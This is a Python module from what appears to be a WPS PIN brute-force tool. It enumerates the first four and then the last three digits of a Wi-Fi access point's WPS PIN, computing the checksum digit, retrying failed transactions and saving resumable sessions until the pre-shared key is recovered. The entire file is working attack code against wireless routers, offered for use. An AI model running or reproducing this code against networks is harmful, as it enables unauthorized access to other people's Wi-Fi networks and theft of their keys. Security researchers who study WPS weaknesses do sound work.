import collections
import statistics
import time
from datetime import datetime
from typing import Union, Deque
import logging

import src.wps.generator
import src.wps.connection
import src.utils

logger = logging.getLogger(__name__)

class BruteforceStatus:
    def __init__(self):
        self.START_TIME: str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.MASK: str = ''
        self.LAST_ATTEMPT_TIME: float = time.time()
        self.ATTEMPTS_TIMES: Deque[float] = collections.deque(maxlen=15)
        self.COUNTER: int = 0
        self.STATISTICS_PERIOD: int = 5

    def displayStatus(self) -> None:
        if not self.ATTEMPTS_TIMES:
            logger.info(f"{self.MASK} complete @ {self.START_TIME} (Calculating average time...)")
            return

        average_pin_time: float = statistics.mean(self.ATTEMPTS_TIMES)

        try:
            if len(self.MASK) == 4:
                percentage: float = int(self.MASK) / 11000 * 100
            else:
                percentage: float = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100
        except ValueError:
            percentage = 0.0

        logger.info('{:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.START_TIME, average_pin_time
        ))

    def registerAttempt(self, mask: str) -> None:
        current_time: float = time.time()
        self.MASK = mask
        self.COUNTER += 1
        self.ATTEMPTS_TIMES.append(current_time - self.LAST_ATTEMPT_TIME)
        self.LAST_ATTEMPT_TIME = current_time

        if self.COUNTER == self.STATISTICS_PERIOD:
            self.COUNTER = 0
            self.displayStatus()

class Initialize:
    def __init__(self, interface: str, args):
        self.BRUTEFORCE_STATUS = BruteforceStatus()
        self.CONNECTION_STATUS: src.wps.connection.ConnectionStatus = src.wps.connection.ConnectionStatus()
        self.GENERATOR: src.wps.generator.WPSpin  = src.wps.generator.WPSpin()
        
        self._loop_mode: bool = args.loop
        self._write: bool = args.write
        self._save: bool = args.save

        self.CONNECTION: src.wps.connection.Initialize = src.wps.connection.Initialize(
            interface,
            self._write,
            self._save
        )

    def _firstHalfBruteforce(self, bssid: str, first_half: str, delay: float = None) -> Union[str, bool]:
        checksum = self.GENERATOR.checksum

        while int(first_half) < 10000:
            t: int = int(first_half + '000')
            pin: str = f'{first_half}000{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION_STATUS.isFirstHalfValid():
                logger.info('First half found')
                return first_half

            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                logger.warning('WPS transaction failed, re-trying last pin')
                if delay:
                    time.sleep(delay)
                continue

            first_half = str(int(first_half) + 1).zfill(4)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half)

            if delay:
                time.sleep(delay)
        
        logger.warning('First half not found')
        return False

    def _secondHalfBruteforce(self, bssid: str, first_half: str, second_half: str, delay: float = None) -> Union[str, bool]:
        checksum = self.GENERATOR.checksum

        while int(second_half) < 1000:
            t: int = int(first_half + second_half)
            pin: str = f'{first_half}{second_half}{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION_STATUS.LAST_M_MESSAGE > 6:
                return pin

            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                logger.warning('WPS transaction failed, re-trying last pin')
                if delay:
                    time.sleep(delay)
                continue

            second_half = str(int(second_half) + 1).zfill(3)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half + second_half)

            if delay:
                time.sleep(delay)

        return False

    def smartBruteforce(self, bssid: str, start_pin: str = None, delay: float = None) -> None:
        sessions_dir = src.utils.SESSIONS_DIR
        filename = sessions_dir / f"{bssid.replace(':', '').upper()}.run"
        mask: str = ''

        if (not start_pin) or (len(start_pin) < 4):
            try:
                if not filename.is_file():
                    raise FileNotFoundError
                
                if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
                    mask = filename.read_text(encoding='utf-8').strip()
                else:
                    raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        self.BRUTEFORCE_STATUS.MASK = mask

        try:
            if len(mask) == 4:
                first_half = self._firstHalfBruteforce(bssid, mask, delay)
                if first_half and (self.CONNECTION_STATUS.STATUS != 'GOT_PSK'):
                    self._secondHalfBruteforce(bssid, str(first_half), '001', delay)
            elif len(mask) == 7:
                first_half = mask[:4]
                second_half = mask[4:]
                self._secondHalfBruteforce(bssid, first_half, second_half, delay)

        except KeyboardInterrupt as e:
            logger.warning('\nAborting…')
            if self._loop_mode:
                raise KeyboardInterrupt from e
        finally:
            try:
                filename.write_text(self.BRUTEFORCE_STATUS.MASK, encoding='utf-8')
                logger.info(f'Session saved in {filename}')
            except (IOError, OSError) as e:
                logger.error(f'Failed to write session file: {e}')